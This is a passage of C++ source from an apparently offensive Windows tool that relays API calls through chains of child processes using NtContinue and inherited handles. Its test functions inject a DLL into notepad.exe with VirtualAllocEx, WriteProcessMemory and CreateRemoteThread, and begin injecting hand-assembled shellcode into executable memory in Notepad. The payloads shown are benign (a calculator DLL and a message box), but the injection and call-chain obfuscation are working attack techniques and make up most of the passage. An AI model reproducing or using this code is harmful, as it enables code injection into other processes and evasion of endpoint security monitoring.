        // ExecuteApiCallAtLevelZero will lead to ProcessResultAndExit.
        // ProcessResultAndExit will use g_hPipeForChildResponse (pipe to *this* child's parent)
        // to send the ApiCallResultResponse.
        // The 'bool' return of ExecuteApiCallAtLevelZero is only about NtContinue launch.

        if (!ExecuteApiCallAtLevelZero(&receivedApiParams, &receivedStackArgs, pNtContinueFunc, pExitFunc, ExitFunc)) {
            // NtContinue itself failed to launch. ProcessResultAndExit will NOT run.
            // This is an error scenario for this level 0 child.
            // We need to construct and send a failure ApiCallResultResponse to *this* child's parent.
            std::cerr << "Child (level 0): ExecuteApiCallAtLevelZero reported NtContinue launch failure." << std::endl;
            responseToSendToMyParent.wasApiCallConsideredSuccess = FALSE; // Explicitly indicate failure of this step
            responseToSendToMyParent.apiReturnValue = 0; // No API was truly called to get RAX
            responseToSendToMyParent.lastErrorValue = GetLastError(); // Error from the NtContinue attempt
            // This 'responseToSendToMyParent' will be written to the pipe below.
        }
        else {
            // If NtContinue was launched, this code path in the 'else' is not reached,
            // as the thread warps. ProcessResultAndExit handles the pipe write.
            // So, if level is 0, the 'WriteFile' below is primarily for the NtContinue failure case.
            // We don't need to do anything with responseToSendToMyParent here if NtContinue succeeded
            // because ProcessResultAndExit takes over.
            // The code below will handle writing responseToSendToMyParent IF NtContinue failed.
            // If NtContinue succeeded, this child process terminates from ProcessResultAndExit.
            // This function 'ProcessChildMode' effectively ends for this thread.
            if (g_hPipeForChildResponse != INVALID_HANDLE_VALUE) {
                CloseHandle(g_hPipeForChildResponse); // Prevent writing if NtContinue succeeded and PRE will write.
                g_hPipeForChildResponse = INVALID_HANDLE_VALUE;
            }
            return TRUE; // Exit main for this child; PRE determined actual success.
        }
    }

    // This section sends the 'responseToSendToMyParent' to this child's actual parent.
    // - If level > 0, 'responseToSendToMyParent' contains what its own child (N-1) sent.
    // - If level == 0 AND NtContinue failed, 'responseToSendToMyParent' contains failure info.
    // - If level == 0 AND NtContinue succeeded, ProcessResultAndExit already handled writing,
    //   and we would have returned from this function earlier.
    if (g_hPipeForChildResponse != INVALID_HANDLE_VALUE) {
        DEBUG_COUT("Child (PID " << GetCurrentProcessId() << ", Level " << level
            << "): Sending ApiCallResultResponse to its parent." << std::endl);
        DEBUG_PRINTF("  To Parent: Success=%s, RAX=0x%llX, LE=%lu\n",
            responseToSendToMyParent.wasApiCallConsideredSuccess ? "T" : "F",
            responseToSendToMyParent.apiReturnValue,
            responseToSendToMyParent.lastErrorValue);

        DWORD bytesWritten;
        if (!WriteFile(g_hPipeForChildResponse, &responseToSendToMyParent, sizeof(ApiCallResultResponse), &bytesWritten, NULL) || bytesWritten != sizeof(ApiCallResultResponse)) {
            std::cerr << "Child (PID " << GetCurrentProcessId() << ", Level " << level
                << "): Failed to write ApiCallResultResponse to pipe for its parent. Error: " << GetLastError() << std::endl;
        }
        else {
            DEBUG_COUT("Child (PID " << GetCurrentProcessId() << ", Level " << level
                << "): Sent ApiCallResultResponse to its parent." << std::endl);
        }
        CloseHandle(g_hPipeForChildResponse);
        g_hPipeForChildResponse = INVALID_HANDLE_VALUE;
    }

    DEBUG_COUT("Child (PID " << GetCurrentProcessId() << ", Level " << level << "): Exiting ProcessChildMode." << std::endl);
    // The exit code of this child process in main() will be based on wasApiCallConsideredSuccess from the response it's forwarding/generating.
    return responseToSendToMyParent.wasApiCallConsideredSuccess == TRUE;
}

void RunAllDelegationTests() {
    std::cout << "\n=============================================" << std::endl;
    std::cout << "=== STARTING ALL RECURSIVE DELEGATION TESTS ===" << std::endl;
    std::cout << "=============================================" << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { // Should always be loaded
        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");

    // --- Test 1: VirtualAllocEx using an INHERITED OpenProcess handle ---
    std::cout << "\n--- TESTING VirtualAllocEx (Self, Inherited OpenProcess Handle) ---" << std::endl;
    HANDLE hSelfProcessInheritable = NULL;
    SECURITY_ATTRIBUTES sa_inherit_process; // Use a distinct SA struct
    sa_inherit_process.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa_inherit_process.lpSecurityDescriptor = NULL;
    sa_inherit_process.bInheritHandle = TRUE;

    hSelfProcessInheritable = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
        TRUE, // This flag on OpenProcess makes the returned handle inheritable
        GetCurrentProcessId()
    );

    if (hSelfProcessInheritable == NULL) {
        std::cerr << "TestRunner: ERROR - OpenProcess failed: " << GetLastError() << std::endl;
    }
    else {
        DEBUG_PRINTF("TestRunner: Opened inheritable handle to self: 0x%llX\n", (DWORD64)hSelfProcessInheritable);
        ApiCallResultResponse vaResponse = {};
        ApiCallParams vaParamsInherit = {};
        strncpy_s(vaParamsInherit.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
        vaParamsInherit.rcx_val = (DWORD64)hSelfProcessInheritable; // Use the inheritable handle
        vaParamsInherit.rdx_val = (DWORD64)NULL;
        vaParamsInherit.r8_val = 20480; // 20KB
        vaParamsInherit.r9_val = MEM_COMMIT | MEM_RESERVE;
        std::vector<DWORD64> vaStackArgsInherit;
        vaStackArgsInherit.push_back(PAGE_EXECUTE_READWRITE);

        const int vaInheritRecursionLevel = 1;
        DEBUG_COUT("TestRunner: Starting VirtualAllocEx (inherited handle) delegation. Max depth: " << vaInheritRecursionLevel << std::endl);
        DEBUG_COUT("RecursiveDelegate(vaInheritRecursionLevel, &vaParamsInherit, &vaStackArgsInherit, pNtContinue, \"default\")" << std::endl);
        bool vaInheritResult = RecursiveDelegate(vaInheritRecursionLevel, &vaParamsInherit, &vaStackArgsInherit, pNtContinue, NULL, "default", &vaResponse);
        std::cout << "TestRunner: VirtualAllocEx (Inherited Handle, Level " << vaInheritRecursionLevel << ") delegation "
            << (vaInheritResult ? "reported success via pipe" : "reported failure/pipe break") << std::endl;
        CloseHandle(hSelfProcessInheritable);
    }
    std::cout << "--- VirtualAllocEx (Inherited Handle) Test Complete ---\n" << std::endl;


    // --- Test 2: VirtualAllocEx using GetCurrentProcess() handle (different size, deeper recursion) ---
    std::cout << "\n--- TESTING VirtualAllocEx (Self, GetCurrentProcess Handle, Deeper Recursion) ---" << std::endl;
    // Re-use hSelfProcessInheritable variable name, but it's a different handle for this test
	// The pseudo-handle GetCurrentProcess() will not work as-is since its just a constant value -1 for self-reference in many WinAPI. It does not represents a real inheritable handle.
	// We can use also DuplicateHandle to create a REAL inheritable handle from the pseudo-handle GetCurrentProcess().
    HANDLE hProcess = NULL;
    DuplicateHandle(
        GetCurrentProcess(),    // Source process is the current process
        GetCurrentProcess(),    // Source handle is the pseudo-handle to the current process
        GetCurrentProcess(),    // Target process is the current process (we're making it inheritable here)
        &hProcess, // This will receive the REAL handle
        0,                      // Desired access (0 for same access as source)
        TRUE,                   // Make the new handle inheritable
        DUPLICATE_SAME_ACCESS   // Options
    );

    ApiCallParams vaParamsPseudo = {};
    ApiCallResultResponse vaResponse = {};

    strncpy_s(vaParamsPseudo.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
    vaParamsPseudo.rcx_val = (DWORD64)hProcess;
    vaParamsPseudo.rdx_val = (DWORD64)NULL;
    vaParamsPseudo.r8_val = (2 << 14); // 32KB
    vaParamsPseudo.r9_val = MEM_COMMIT | MEM_RESERVE;
    std::vector<DWORD64> vaStackArgsPseudo;
    vaStackArgsPseudo.push_back(PAGE_EXECUTE_READWRITE);

    const int vaPseudoRecursionLevel = 2;
    DEBUG_COUT("TestRunner: Starting VirtualAllocEx (GetCurrentProcess handle) delegation. Max depth: " << vaPseudoRecursionLevel << std::endl);
    bool vaPseudoResult = RecursiveDelegate(vaPseudoRecursionLevel, &vaParamsPseudo, &vaStackArgsPseudo, pNtContinue, NULL, "default", &vaResponse);
    std::cout << "TestRunner: VirtualAllocEx (GetCurrentProcess Handle, Level " << vaPseudoRecursionLevel << ") delegation "
        << (vaPseudoResult ? "reported success via pipe" : "reported failure/pipe break") << std::endl;
    std::cout << "--- VirtualAllocEx (GetCurrentProcess Handle) Test Complete ---\n" << std::endl;


    // --- Test 3: SetEvent with an inherited handle (deeper recursion) ---
    std::cout << "\n--- TESTING SetEvent with Inherited Handle (Deeper Recursion) ---" << std::endl;
    FARPROC pSetEvent = ResolveFunction("Kernel32!SetEvent"); // Resolve once for the test
    if (!pSetEvent) { // Check if ResolveFunction succeeded
        std::cerr << "TestRunner: ERROR - Could not resolve Kernel32!SetEvent. Skipping SetEvent test." << std::endl;
    }
    else {
        SECURITY_ATTRIBUTES sa_event;
        sa_event.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa_event.lpSecurityDescriptor = NULL;
        sa_event.bInheritHandle = TRUE;

        HANDLE hEventForChild = CreateEventA(&sa_event, TRUE, FALSE, "MyRecursiveEventTestForStub");
        if (hEventForChild == NULL) {
            std::cerr << "TestRunner: ERROR - CreateEventA failed: " << GetLastError() << std::endl;
        }
        else {
            DEBUG_PRINTF("TestRunner: Created inheritable event handle: 0x%llX\n", (DWORD64)hEventForChild);

            ApiCallParams seParams = {};
            ApiCallResultResponse vaResponse = {};

            strncpy_s(seParams.funcNameWithModule, "Kernel32!SetEvent", _TRUNCATE);
            seParams.rcx_val = (DWORD64)hEventForChild;
            std::vector<DWORD64> seStackArgs; // No stack args for SetEvent

            const int eventTestRecursionLevel = 3; // Let's try a bit deeper
            std::cout << "TestRunner: Delegating SetEvent. Parent (TestRunner) will wait on the event." << std::endl;
            bool delegateResult = RecursiveDelegate(eventTestRecursionLevel, &seParams, &seStackArgs, pNtContinue, NULL, "default", &vaResponse);

            if (delegateResult) { // This means the entire chain up to level 1 successfully got TRUE from its child
                DEBUG_COUT("TestRunner: RecursiveDelegate for SetEvent reported success indication from child pipe." << std::endl);
                DWORD waitResult = WaitForSingleObject(hEventForChild, 10000); // Wait up to 10 seconds
                if (waitResult == WAIT_OBJECT_0) {
                    std::cout << "TestRunner: SUCCESS - Event was signaled by a delegated process!" << std::endl;
                }
                else if (waitResult == WAIT_TIMEOUT) {
                    std::cout << "TestRunner: TIMEOUT - Event was NOT signaled by delegated process." << std::endl;
                }
                else {
                    std::cout << "TestRunner: ERROR - WaitForSingleObject on event failed: " << GetLastError() << std::endl;
                }
            }
            else {
                std::cout << "TestRunner: RecursiveDelegate for SetEvent reported failure/pipe issue from some child." << std::endl;
            }
            CloseHandle(hEventForChild);
        }
    }
    std::cout << "--- SetEvent Test Complete ---\n" << std::endl;
    std::cout << "\n============================================" << std::endl;
    std::cout << "=== ALL RECURSIVE DELEGATION TESTS ENDED ===" << std::endl;
    std::cout << "============================================" << std::endl;
}

int InjectDllToNotepadTest(int recursiveDelegationLevel) {
    // Test inject calc dll to notepad
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { // Should always be loaded
        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return 1;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");

    std::cout << "\n--- TESTING NOTEPAD DLL INJECTION ---" << std::endl;
    const char* dllPath = "C:\\Users\\Argentix\\Downloads\\CalcDLL64.dll"; // MAKE SURE THIS PATH IS CORRECT

    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        std::cerr << "NotepadInjectionTest: ERROR - DLL not found at: " << dllPath << std::endl;
        std::cout << "--- Notepad DLL Injection Test SKIPPED ---" << std::endl;
        return 1;
    }

    DWORD notepadPid = FindProcessPid(L"notepad.exe");
    if (notepadPid == 0) {
        std::cout << "--- Notepad DLL Injection Test FAILED (Notepad not found) ---" << std::endl;
        return 1;
    }

    HANDLE hNotepad = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        TRUE, // << IMPORTANT: Make handle inheritable for child processes
        notepadPid
    );

    if (hNotepad == NULL) {
        std::cerr << "NotepadInjectionTest: OpenProcess failed for PID " << notepadPid << ". Error: " << GetLastError() << std::endl;
        std::cout << "--- Notepad DLL Injection Test FAILED ---" << std::endl;
        return 1;
    }
    DEBUG_PRINTF("NotepadInjectionTest: Opened inheritable handle to notepad.exe (PID %lu): 0x%p\n", notepadPid, hNotepad);


    

    // 1. VirtualAllocEx in Notepad
    ApiCallResultResponse vaResponse = {};
    ApiCallParams vaParams = {};

    strncpy_s(vaParams.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
	vaParams.rcx_val = (DWORD64)hNotepad;       // Inherited handle to Notepad
    vaParams.rdx_val = (DWORD64)NULL;           // lpAddress (let system choose)
	vaParams.r8_val = strlen(dllPath) + 1;      // dwSize
    vaParams.r9_val = MEM_COMMIT | MEM_RESERVE; // flAllocationType
    std::vector<DWORD64> vaStackArgs;
    vaStackArgs.push_back(PAGE_READWRITE);      // flProtect

    std::cout << "NotepadInjectionTest: Delegating VirtualAllocEx..." << std::endl;
    DEBUG_PRINTF("InjectDllToNotepadTest: VirtualAllocEx PARAMS: hProc=0x%llX, lpAddr=0x%llX, dwSize=0x%llX (%llu), flAlloc=0x%llX, flProt=0x%llX\n",
        vaParams.rcx_val, vaParams.rdx_val, vaParams.r8_val, vaParams.r8_val, vaParams.r9_val, vaStackArgs[0]);

    bool delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &vaParams, &vaStackArgs, pNtContinue, NULL, "default", &vaResponse);

    // Interpret output inside ApiCallResultResponse
    if (!delegationChainSuccess) { // This means a pipe broke or a child in the chain reported failure via its wasApiCallConsideredSuccess
        std::cerr << "--- Notepad DLL Injection Test FAILED (VirtualAllocEx delegation chain reported failure) ---" << std::endl;
        std::cerr << "    Inspect child process debug output. Received response: Success="
            << (vaResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << vaResponse.apiReturnValue << std::dec
            << ", ChildLE=" << vaResponse.lastErrorValue << std::endl;
        CloseHandle(hNotepad);
        return 1; 
    }

    // At this point, delegationChainSuccess is TRUE.
    // This means ProcessResultAndExit in the final child was reached and sent back a response where
    // response.wasApiCallConsideredSuccess was TRUE.
    // Now, you need to check the actual API outcome from vaResponse.apiReturnValue (RAX).
    DEBUG_COUT("NotepadInjectionTest: VirtualAllocEx delegation chain reported success." << std::endl);
    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX, Child's GetLastError() at helper = %lu\n",
        vaResponse.apiReturnValue, vaResponse.lastErrorValue);

    if (vaResponse.apiReturnValue == 0) { // VirtualAllocEx failed if it returned NULL
        std::cerr << "--- Notepad DLL Injection Test FAILED (VirtualAllocEx API call itself failed in child) ---" << std::endl;
        std::cerr << "    RAX was 0. Child's GetLastError() in helper: " << vaResponse.lastErrorValue
            << ". Parent's GetLastError() after OpenProcess/etc. might be different or 0." << std::endl;
        CloseHandle(hNotepad);
        return 1;
    }

    DWORD64 remoteMemAddress = vaResponse.apiReturnValue; // THIS IS THE ALLOCATED ADDRESS
    std::cout << "NotepadInjectionTest: VirtualAllocEx successful. Remote address: 0x" << std::hex << remoteMemAddress << std::dec << std::endl;

    // 2. WriteProcessMemory to Notepad

	// Copy the DLL path to a shared memory section - NO! We get more clever than having a leaf child to root parent shortcut.
	//if (g_pSharedSection == NULL) {
	//	std::cerr << "NotepadInjectionTest: ERROR - g_pSharedSection is NULL. Shared memory section not initialized." << std::endl;
	//	CloseHandle(hNotepad);
	//	return 1;
	//}

    ApiCallResultResponse wpmResponse;
    ApiCallParams wpmParams = {};
    strncpy_s(wpmParams.funcNameWithModule, "Kernel32!WriteProcessMemory", _TRUNCATE);
    wpmParams.rcx_val = (DWORD64)hNotepad;
    wpmParams.rdx_val = remoteMemAddress;         // lpBaseAddress
    //wpmParams.r8_val = (DWORD64)dllPath;        // lpBuffer (address of our local string) we can place the data on stack and calculate the arg value after.
    wpmParams.r9_val = strlen(dllPath) + 1;       // nSize

    std::vector<DWORD64> wpmStackArgs;
    wpmStackArgs.push_back((DWORD64)NULL);        // lpNumberOfBytesWritten (optional)

	// lpBuffer cant be a pointer in our process so we can serialize the DLL path into a vector of DWORD64s
    // place them on the stack and tell the executor to treat this as a stack relative pointer.

    // Serialize dllPath into stack arguments.
    wpmParams.r8_val = (DWORD64)wpmStackArgs.size() * sizeof(DWORD64); // Set r8 to the offset value of where we will start pushing the string into
	wpmParams.r8_is_ptr_offset_from_stack = TRUE;                      // Indicate that r8_val is an offset from the stack pointer, meaning it is to be treated as a hint to the final address
    const char* pStr = dllPath;
    size_t dllPathActualLen = strlen(dllPath) + 1;
    size_t numQwordsForDllPath = (dllPathActualLen + sizeof(DWORD64) - 1) / sizeof(DWORD64);

    char tempQwordBuffer[sizeof(DWORD64)];
    for (size_t i = 0; i < numQwordsForDllPath; ++i) {
        ZeroMemory(tempQwordBuffer, sizeof(DWORD64));
        size_t remainingBytes = dllPathActualLen - (i * sizeof(DWORD64));
        size_t bytesToCopyThisChunk = min(remainingBytes, sizeof(DWORD64));
        if (bytesToCopyThisChunk > 0) {
            memcpy(tempQwordBuffer, pStr + (i * sizeof(DWORD64)), bytesToCopyThisChunk);
        }
        wpmStackArgs.push_back(*(DWORD64*)tempQwordBuffer); // These QWORDS are added *after* the initial NULL
    }
    // Example:
    // dllPath: "C:\Users\Argentix\Downloads\CalcDLL64.dll"
    // wpmStackData[0] = NULL (for lpNumberOfBytesWritten)
    // wpmStackData[1] = First QWORD of DLL path "C:\\User"
    // wpmStackData[2] = Second QWORD of DLL path "s\Argent" ...
    // r8_val = offset from to wpmStackData to wpmStackData[1] where we started placing our dll string
    // r8_is_ptr_offset_from_stack = true
	// This way, the final Context value for R8 will be fixed into the absolute address of wpmStackData[1] in the executor process.


    std::cout << "NotepadInjectionTest: Delegating WriteProcessMemory..." << std::endl;
    DEBUG_PRINTF("InjectDllToNotepadTest: WriteProcessMemory PARAMS: hProc=0x%llX, lpBaseAddr=0x%llX, lpBuff=0x%llX, nSize=0x%llX (%llu)\n",
        wpmParams.rcx_val, wpmParams.rdx_val, wpmParams.r8_val, wpmParams.r9_val, wpmParams.r9_val);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &wpmParams, &wpmStackArgs, pNtContinue, NULL, "default", &wpmResponse); // Use wpmResponse

    if (!delegationChainSuccess) {
        std::cerr << "--- Notepad DLL Injection Test FAILED (WriteProcessMemory delegation chain reported failure) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (wpmResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << wpmResponse.apiReturnValue << std::dec
            << ", ChildLE=" << wpmResponse.lastErrorValue << std::endl;
        // Consider VirtualFreeEx here
        CloseHandle(hNotepad);
        return 1;
    }

    DEBUG_COUT("NotepadInjectionTest: WriteProcessMemory delegation chain reported success by child." << std::endl);
    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX, Child's GetLastError() at helper = %lu\n",
        wpmResponse.apiReturnValue, wpmResponse.lastErrorValue);

    if (wpmResponse.apiReturnValue == 0) { // WriteProcessMemory returns non-zero (BOOL TRUE equivalent) on success
        std::cerr << "--- Notepad DLL Injection Test FAILED (WriteProcessMemory API call itself failed in child) ---" << std::endl;
        std::cerr << "    RAX was 0 (indicates failure). Child's GetLastError() in helper: " << wpmResponse.lastErrorValue << std::endl;
        // Consider VirtualFreeEx here
        CloseHandle(hNotepad);
        return 1;
    }
    std::cout << "NotepadInjectionTest: WriteProcessMemory successful." << std::endl;

    // --- 3. CreateRemoteThread in Notepad ---
    FARPROC pLoadLibraryA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!pLoadLibraryA) {
        std::cerr << "NotepadInjectionTest: Failed to get address of LoadLibraryA. Error: " << GetLastError() << std::endl;
        CloseHandle(hNotepad);
        // Consider VirtualFreeEx here
        std::cout << "--- Notepad DLL Injection Test FAILED ---" << std::endl;
        return 1;
    }

    ApiCallResultResponse crtResponse = {}; // Initialize
    ApiCallParams crtParams = {};

    strncpy_s(crtParams.funcNameWithModule, "Kernel32!CreateRemoteThread", _TRUNCATE);
    crtParams.rcx_val = (DWORD64)hNotepad;
    crtParams.rdx_val = (DWORD64)NULL;          // lpThreadAttributes
    crtParams.r8_val = 0;                       // dwStackSize
    crtParams.r9_val = (DWORD64)pLoadLibraryA;  // lpStartAddress
    std::vector<DWORD64> crtStackArgs;
    crtStackArgs.push_back(remoteMemAddress);   // lpParameter (address of DLL path in remote process)
    crtStackArgs.push_back(0);                  // dwCreationFlags
    crtStackArgs.push_back((DWORD64)NULL);      // lpThreadId (optional)

    std::cout << "NotepadInjectionTest: Delegating CreateRemoteThread..." << std::endl;
    DEBUG_PRINTF("InjectDllToNotepadTest: CreateRemoteThread PARAMS: hProc=0x%llX, lpStartAddr=0x%llX, lpParam=0x%llX\n",
        crtParams.rcx_val, crtParams.r9_val, crtStackArgs[0]);

    delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &crtParams, &crtStackArgs, pNtContinue, NULL, "default", &crtResponse); // Use crtResponse

    if (!delegationChainSuccess) {
        std::cerr << "--- Notepad DLL Injection Test FAILED (CreateRemoteThread delegation chain reported failure) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (crtResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << crtResponse.apiReturnValue << std::dec
            << ", ChildLE=" << crtResponse.lastErrorValue << std::endl;
        // Consider VirtualFreeEx here
        CloseHandle(hNotepad);
        return 1;
    }

    DEBUG_COUT("NotepadInjectionTest: CreateRemoteThread delegation chain reported success by child." << std::endl);
    DEBUG_PRINTF("  Actual API Result: RAX = 0x%llX (Thread Handle), Child's GetLastError() at helper = %lu\n",
        crtResponse.apiReturnValue, crtResponse.lastErrorValue);

    if (crtResponse.apiReturnValue == 0) { // CreateRemoteThread returns NULL (0) on failure
        std::cerr << "--- Notepad DLL Injection Test FAILED (CreateRemoteThread API call itself failed in child) ---" << std::endl;
        std::cerr << "    RAX was 0 (Thread Handle is NULL). Child's GetLastError() in helper: " << crtResponse.lastErrorValue << std::endl;
        // Consider VirtualFreeEx here
        CloseHandle(hNotepad);
        return 1;
    }

    HANDLE hRemoteThread = (HANDLE)crtResponse.apiReturnValue;
    std::cout << "NotepadInjectionTest: CreateRemoteThread successful. Remote thread handle: 0x" << std::hex << (DWORD64)hRemoteThread << std::dec << std::endl;
    std::cout << "NotepadInjectionTest: Waiting for remote thread to complete (max 10s)..." << std::endl;

    DWORD waitResult = WaitForSingleObject(hRemoteThread, 10000); // Wait for the thread
    if (waitResult == WAIT_OBJECT_0) {
        std::cout << "NotepadInjectionTest: Remote thread finished." << std::endl;
    }
    else if (waitResult == WAIT_TIMEOUT) {
        std::cout << "NotepadInjectionTest: Remote thread timed out." << std::endl;
    }
    else {
        std::cerr << "NotepadInjectionTest: WaitForSingleObject on remote thread failed. Error: " << GetLastError() << std::endl;
    }

    std::cout << "--- Notepad DLL Injection Test Potentially Successful (check if calc appears!) ---" << std::endl;

    return 0;
}

int InjectShellcodeToNotepadTest(int recursiveDelegationLevel) {

    std::cout << "\n--- TESTING NOTEPAD SHELLCODE INJECTION ---" << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) { // Should always be loaded
        hNtdll = LoadLibraryA("ntdll.dll"); // Attempt to load if somehow not found
        if (!hNtdll) {
            std::cerr << "main: CRITICAL - Failed to load ntdll.dll. Error: " << GetLastError() << std::endl;
            return 1;
        }
    }

    NtContinue_t pNtContinue = (NtContinue_t)GetProcAddress(hNtdll, "NtContinue");

    unsigned char shellcode[] = {
        /* 00 */ 0x48, 0x83, 0xEC, 0x28,                    // sub  rsp, 28h
        /* 04 */ 0x48, 0x31, 0xC9,                          // xor  rcx, rcx        ; hWnd = NULL
        /* 07 */ 0x48, 0x8D, 0x15, 0x23, 0x00, 0x00, 0x00,  // lea  rdx,[rip+23h]   ; lpText ("Hello from...")
        /* 0E */ 0x4C, 0x8D, 0x05, 0x3B, 0x00, 0x00, 0x00,  // lea  r8, [rip+3Bh]   ; lpCaption ("Injected")
        /* 15 */ 0x41, 0xB9, 0x00, 0x00, 0x00, 0x00,        // mov  r9d,0          ; MB_OK
        /* 1B */ 0x48, 0x8B, 0x05, 0x07, 0x00, 0x00, 0x00,  // mov  rax,[rip+7]    ; &MessageBoxA placeholder
        /* 22 */ 0xFF, 0xD0,                                // call rax
        /* 24 */ 0x48, 0x83, 0xC4, 0x28,                    // add  rsp, 28h
        /* 28 */ 0xC3,                                      // ret
        /* 29 .dq */ 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,   // QWORD for &MessageBoxA to be patched
        /* 31 .db */ 'H','e','l','l','o',' ','f','r','o','m',' ',
                     'i','n','j','e','c','t','e','d',' ',
                     's','h','e','l','l','c','o','d','e','!','\0', // Null-terminated string 1
                     /* 50 .db */ 'I','n','j','e','c','t','e','d','\0'          // Null-terminated string 2
                     // Make sure sizeof(shellcode) is correct for all these bytes.
                     // String 1 length: 30 + 1 null = 31 bytes (0x1F)
                     // String 2 length: 8 + 1 null = 9 bytes (0x09)
                     // Code before placeholder: 0x29 bytes
                     // Placeholder: 8 bytes
                     // Total: 0x29 (41) + 8 + 31 + 9 = 41 + 8 + 40 = 89 bytes (0x59)
                     // If the array definition is just as above, sizeof() will get it right.
    };

    // 1. Patch MessageBoxA address in our local copy of the shellcode
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) {
        LoadLibraryA("user32.dll"); // Ensure user32.dll is loaded
        hUser32 = GetModuleHandleA("user32.dll");
    }
    if (!hUser32) {
        std::cerr << "ShellcodeInjectionTest: Failed to get/load user32.dll. Error: " << GetLastError() << std::endl;
        return 1;
    }
    FARPROC pMessageBoxA = GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBoxA) {
        std::cerr << "ShellcodeInjectionTest: Failed to get MessageBoxA address. Error: " << GetLastError() << std::endl;
        return 1;
    }
    // Patch address at offset 0x29 (index of the QWORD placeholder)
    *reinterpret_cast<void**>(shellcode + 0x29) = pMessageBoxA;
    DEBUG_PRINTF("ShellcodeInjectionTest: Patched local shellcode with MessageBoxA at 0x%p\n", pMessageBoxA);


    // 2. Find Notepad
    DWORD notepadPid = FindProcessPid(L"notepad.exe"); // Assuming FindProcessPid takes wchar_t
    if (notepadPid == 0) {
        std::cout << "--- Notepad Shellcode Injection Test FAILED (Notepad not found) ---" << std::endl;
        return 1;
    }

    HANDLE hNotepad = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        TRUE,
        notepadPid
    );
    if (hNotepad == NULL) {
        std::cerr << "ShellcodeInjectionTest: OpenProcess failed for PID " << notepadPid << ". Error: " << GetLastError() << std::endl;
        return 1;
    }
    DEBUG_PRINTF("ShellcodeInjectionTest: Opened inheritable handle to notepad.exe (PID %lu): 0x%p\n", notepadPid, hNotepad);


    // 3. VirtualAllocEx in Notepad for the shellcode
    ApiCallResultResponse vaResponse = {};
    ApiCallParams vaParams = {};

    strncpy_s(vaParams.funcNameWithModule, "Kernel32!VirtualAllocEx", _TRUNCATE);
    vaParams.rcx_val = (DWORD64)hNotepad;
    vaParams.rdx_val = (DWORD64)NULL;           // Let system choose address
    vaParams.r8_val = sizeof(shellcode);        // Size of the shellcode
    vaParams.r9_val = MEM_COMMIT | MEM_RESERVE;
    std::vector<DWORD64> vaStackArgs;
    vaStackArgs.push_back(PAGE_EXECUTE_READWRITE); // <<<< EXECUTE permission needed for shellcode

    std::cout << "ShellcodeInjectionTest: Delegating VirtualAllocEx for shellcode..." << std::endl;
    DEBUG_PRINTF("InjectShellcodeToNotepadTest: VirtualAllocEx PARAMS: hProc=0x%llX, lpAddr=0x%llX, dwSize=0x%llX (%llu), flAlloc=0x%llX, flProt=0x%llX\n",
        vaParams.rcx_val, vaParams.rdx_val, vaParams.r8_val, vaParams.r8_val, vaParams.r9_val, vaStackArgs[0]);

    bool delegationChainSuccess = RecursiveDelegate(recursiveDelegationLevel, &vaParams, &vaStackArgs, pNtContinue, NULL, "default", &vaResponse);

    if (!delegationChainSuccess || vaResponse.apiReturnValue == 0) {
        std::cerr << "--- Notepad Shellcode Injection Test FAILED (VirtualAllocEx "
            << (!delegationChainSuccess ? "delegation chain" : "API call")
            << " failed) ---" << std::endl;
        std::cerr << "    Response: SuccessFlag=" << (vaResponse.wasApiCallConsideredSuccess ? "TRUE" : "FALSE")
            << ", RAX=0x" << std::hex << vaResponse.apiReturnValue << std::dec
            << ", ChildLE=" << vaResponse.lastErrorValue << std::endl;
        CloseHandle(hNotepad);
        return 1;
    }

    DWORD64 remoteShellcodeMemAddress = vaResponse.apiReturnValue;
    std::cout << "ShellcodeInjectionTest: VirtualAllocEx for shellcode successful. Remote address: 0x" << std::hex << remoteShellcodeMemAddress << std::dec << std::endl;


    // 4. WriteProcessMemory to write the shellcode into Notepad
    ApiCallResultResponse wpmResponse = {};
    ApiCallParams wpmParams = {};

    strncpy_s(wpmParams.funcNameWithModule, "Kernel32!WriteProcessMemory", _TRUNCATE);
    wpmParams.rcx_val = (DWORD64)hNotepad;
